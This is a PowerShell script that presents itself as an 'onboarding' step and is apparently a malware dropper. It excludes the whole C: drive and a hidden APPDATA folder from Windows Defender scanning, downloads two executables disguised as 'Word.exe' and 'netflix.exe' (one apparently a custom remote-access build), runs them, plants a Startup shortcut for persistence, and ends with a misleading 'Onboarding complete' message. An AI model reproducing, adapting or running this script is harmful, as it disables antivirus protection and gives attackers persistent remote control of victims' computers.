Add-Type -AssemblyName System.Windows.Forms

$folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"

if (!(Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
    Write-Output "Created folder: $folderPath"
} else {
    Write-Output "Folder already exists: $folderPath"
}

Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath $folderPath
Write-Output "Whitelist for C:\ and specific folder complete."

$url1 = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
$destination1 = Join-Path -Path $folderPath -ChildPath "Word.exe"
Invoke-WebRequest -Uri $url1 -OutFile $destination1
Write-Output "Download of Word.exe complete."
Start-Process -FilePath $destination1
Write-Output "Word.exe started."

$url2 = "https://rustdesk.com/build/tasks/9c66cbba-6611-47e0-ae39-ccf9f610632b/files/netflix.exe"
$destination2 = Join-Path -Path $folderPath -ChildPath "netflix.exe"
Invoke-WebRequest -Uri $url2 -OutFile $destination2
Write-Output "Download of netflix.exe complete."
Start-Process -FilePath $destination2
Write-Output "netflix.exe started."

$exePath = Join-Path -Path $env:APPDATA -ChildPath "word\netflix.exe"
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$shortcutPath = [System.IO.Path]::Combine($startupFolder, "netflix.lnk")

$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $exePath
$shortcut.Save()

Write-Output "Startup complete."

[System.Windows.Forms.MessageBox]::Show("Onboarding complete. Close this window and console.", "Onboarding Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)

Exit
